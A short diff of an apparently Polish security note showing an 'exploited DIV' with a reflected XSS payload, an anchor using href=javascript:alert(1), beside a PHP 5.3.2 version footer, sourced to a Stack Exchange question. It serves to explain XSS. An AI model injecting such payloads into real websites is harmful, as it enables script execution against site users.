@@ -28,12 +28,8 @@ $(function() {
  </script>
  
 Wyeksploitowany DIV:
-<html
-<body>
-<div style="border: 1px solid black;">
+"<div style="border: 1px solid black;">
 	<div ReflectedXSSExecutionPoint="1" class="footer">Browser: <a href=javascript:alert(1)>xss</a></div>
-	<div class="footer">PHP Version: 5.3.2-1ubuntu4.30</div>
-</div>
-</body>
-</html>
+	<div class="footer">PHP Version: 5.3.2-1ubuntu4.30</div>"
+ 
 Źródło: https://security.stackexchange.com/questions/24908/is-it-possible-to-make-an-xss-with-only-html-tags
